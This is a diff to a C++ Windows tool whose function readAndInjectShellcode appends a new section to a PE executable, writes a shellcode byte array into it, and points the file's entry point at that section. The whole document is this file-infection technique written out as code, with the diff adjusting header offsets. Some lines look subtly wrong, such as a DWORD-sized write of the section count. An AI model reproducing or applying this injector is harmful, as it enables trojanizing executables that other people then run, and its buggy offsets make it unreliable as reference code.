@@ -2,7 +2,7 @@
 #include <fstream>
 #include <Windows.h>
 
-constexpr BYTE shellcode[] = {
+BYTE shellcode[] = {
     0x68, 0xA0, 0x99, 0x44, 0x00, 0xC3
 };
 
@@ -24,7 +24,7 @@ bool readAndInjectShellcode(const wchar_t* filePath) {
         return false;
     }
 
-    BYTE* fileBuffer = new (std::nothrow) BYTE[fileSize];
+    BYTE* fileBuffer = new BYTE[fileSize];
     if (fileBuffer == nullptr) {
         printErrorMessage("Failed to allocate memory");
         CloseHandle(fileHandle);
@@ -43,7 +43,7 @@ bool readAndInjectShellcode(const wchar_t* filePath) {
 	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
 	DWORD ret = SetFilePointer(fileHandle, dosHeader->e_lfanew, NULL, FILE_BEGIN);
 	DWORD newCharacteristics;
-	DWORD offsetToDllCharacteristics = dosHeader->e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + offsetof(IMAGE_OPTIONAL_HEADER32, DllCharacteristics);
+	DWORD offsetToDllCharacteristics = ret + 4 + sizeof(IMAGE_FILE_HEADER) + offsetof(IMAGE_OPTIONAL_HEADER32, DllCharacteristics);
 
 	if (ret != INVALID_SET_FILE_POINTER) {
 
@@ -68,12 +68,12 @@ bool readAndInjectShellcode(const wchar_t* filePath) {
 		newSection.VirtualAddress = newSectionVirtualAddress;
 
 		// Add new section information to section header
-		SetFilePointer(fileHandle, dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + ntHeader->FileHeader.NumberOfSections * 40, NULL, FILE_BEGIN);
+		SetFilePointer(fileHandle, ret + sizeof(IMAGE_NT_HEADERS) + ntHeader->FileHeader.NumberOfSections * 40, NULL, FILE_BEGIN);
 		WriteFile(fileHandle, &newSection, sizeof(newSection), NULL, NULL);
 
 		// Update the number of section existed within the file
 		ntHeader->FileHeader.NumberOfSections++;
-		SetFilePointer(fileHandle, dosHeader->e_lfanew + 6, NULL, FILE_BEGIN);
+		SetFilePointer(fileHandle, ret + 6, NULL, FILE_BEGIN);
 		WriteFile(fileHandle, &ntHeader->FileHeader.NumberOfSections, sizeof(DWORD), NULL, NULL);
 
 		// Inject the shellcode
@@ -97,14 +97,14 @@ bool readAndInjectShellcode(const wchar_t* filePath) {
 
 		// Recalculate the SizeOfImage and roundit up with SectionAlignment
 		sizeOfImage = sizeOfImage + codeSize + (sectionAlignment - 1) & ~(sectionAlignment - 1);
-		SetFilePointer(fileHandle, dosHeader->e_lfanew + 80, NULL, FILE_BEGIN);
+		SetFilePointer(fileHandle, ret + 4 + sizeof(IMAGE_FILE_HEADER) + offsetof(IMAGE_OPTIONAL_HEADER32,SizeOfImage), NULL, FILE_BEGIN);
 		WriteFile(fileHandle, &sizeOfImage, sizeof(DWORD), NULL, NULL);
 		SetFilePointer(fileHandle, newSection.PointerToRawData + newSection.SizeOfRawData, NULL, FILE_BEGIN);
 		SetEndOfFile(fileHandle);
 
 		// Adjust the AddressOfEntryPoint to point to the new section
 		ntHeader->OptionalHeader.AddressOfEntryPoint = newSectionVirtualAddress;
-		SetFilePointer(fileHandle, dosHeader->e_lfanew + 40, NULL, FILE_BEGIN);
+		SetFilePointer(fileHandle, ret + 40, NULL, FILE_BEGIN);
 		WriteFile(fileHandle, &newSectionVirtualAddress, sizeof(DWORD), NULL, NULL);
 
 	}
